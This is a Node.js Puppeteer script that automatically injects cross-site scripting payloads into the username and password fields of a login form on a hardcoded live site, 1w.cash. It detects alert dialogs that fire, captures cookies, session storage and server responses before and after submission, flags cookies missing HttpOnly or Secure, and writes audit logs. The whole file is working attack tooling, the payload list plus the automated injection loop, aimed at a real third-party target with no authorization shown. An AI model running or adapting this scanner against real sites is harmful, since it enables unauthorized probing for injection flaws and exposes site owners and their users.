const puppeteer = require('puppeteer');
const fs = require('fs');

const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

const targetUrl = 'https://1w.cash'; 

const FORM_FIELDS = [
    { name: 'Username Field', selector: 'input[name="username"]', safeValue: 'valid_test_user' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';

async function scanWithFullAudit() {
    console.log(`[+] Initializing Chromium Browser with Storage and Response Monitors...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let targetField of FORM_FIELDS) {
        console.log(`\n==================================================`);
        console.log(`[🚀 FULL AUDIT]: ${targetField.name}`);
        console.log(`==================================================`);

        for (let payload of payloads) {
            const page = await browser.newPage();
            let lastServerResponseText = "";

            // Intercepting backend server raw responses
            page.on('response', async (response) => {
                const url = response.url();
                if (url.includes('api') || url === targetUrl || response.status() >= 400) {
                    try {
                        const contentType = response.headers()['content-type'] || '';
                        if (contentType.includes('json') || contentType.includes('text/html')) {
                            lastServerResponseText = await response.text();
                        }
                    } catch (err) {}
                }
            });

            // Listen for structural client-side XSS dialog boxes
            page.on('dialog', async dialog => {
                if (dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS EXECUTED!] Field: ${targetField.name} | Payload: ${payload}`);
                    await dialog.dismiss();
                }
            });

            try {
                await page.goto(targetUrl, { waitUntil: 'networkidle2' });

                // --- SNAPSHOT 1: CAPTURING INITIAL STORAGE STATE ---
                const initialCookies = await page.cookies();
                const initialSessionStorage = await page.evaluate(() => JSON.stringify(sessionStorage));

                // Fill form fields sequentially
                for (let currentField of FORM_FIELDS) {
                    await page.waitForSelector(currentField.selector, { timeout: 4000 });
                    await page.click(currentField.selector);
                    
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');

                    if (currentField.name === targetField.name) {
                        console.log(`[*] Injecting payload into ${currentField.name}: ${payload}`);
                        await page.type(currentField.selector, payload);
                    } else {
                        await page.type(currentField.selector, currentField.safeValue);
                    }
                }

                // Submit the interactive form elements
                await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                console.log(`[*] Submitting and monitoring redirection state...`);
                
                await Promise.all([
                    page.click(SUBMIT_SELECTOR),
                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                ]);

                // --- SNAPSHOT 2: CAPTURING POST-SUBMISSION STORAGE STATE ---
                const finalCookies = await page.cookies();
                const finalSessionStorage = await page.evaluate(() => JSON.stringify(sessionStorage));
                const visibleHtmlTree = await page.evaluate(() => document.body.innerHTML);

                // Analyze cookie flag security controls (Strictly related to program compliance checklists)
                let insecureCookieWarnings = "";
                finalCookies.forEach(cookie => {
                    if (!cookie.httpOnly) {
                        insecureCookieWarnings += `[⚠️ COOKIE RISK] Cookie '${cookie.name}' is missing HttpOnly flag. Frontend scripts can read it.\n`;
                    }
                    if (!cookie.secure) {
                        insecureCookieWarnings += `[⚠️ COOKIE RISK] Cookie '${cookie.name}' is missing Secure flag. Transmitted via plaintext HTTP paths.\n`;
                    }
                });

                // Generate and save detailed audit logging outputs
                const logFileName = `audit_${targetField.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
                const auditContent = 
`=========================================
TRANSACTION SCOPE & INPUT DATA
=========================================
Target Field: ${targetField.name}
Payload String: ${payload}
Final Redirected URL: ${page.url()}

=========================================
[STORAGE LAYER AUDIT] COOKIES & KEYS
=========================================
${insecureCookieWarnings || "[+] All active session cookies have security flags intact.\n"}
INITIAL COOKIES:
${JSON.stringify(initialCookies, null, 2)}

POST-SUBMISSION COOKIES:
${JSON.stringify(finalCookies, null, 2)}

INITIAL SESSION STORAGE:
${initialSessionStorage}

POST-SUBMISSION SESSION STORAGE:
${finalSessionStorage}

=========================================
[NETWORK LAYER AUDIT] LAST RESPONSES
=========================================
${lastServerResponseText || "[-] No dynamic response data captured from active execution frames."}

=========================================
[DOM LAYER REFLECTION AUDIT] (TRUNCATED)
=========================================
${visibleHtmlTree.substring(0, 500)}...
\n`;

                fs.writeFileSync(logFileName, auditContent);
                console.log(`[+] Full execution audit traces written out to: ${logFileName}`);

            } catch (error) {
                console.log(`[-] Process timed out or altered during request cycle.`);
            } finally {
                await page.close();
            }
        }
    }

    console.log(`\n[+] Full System Audit Completed.`);
    await browser.close();
}

scanWithFullAudit();
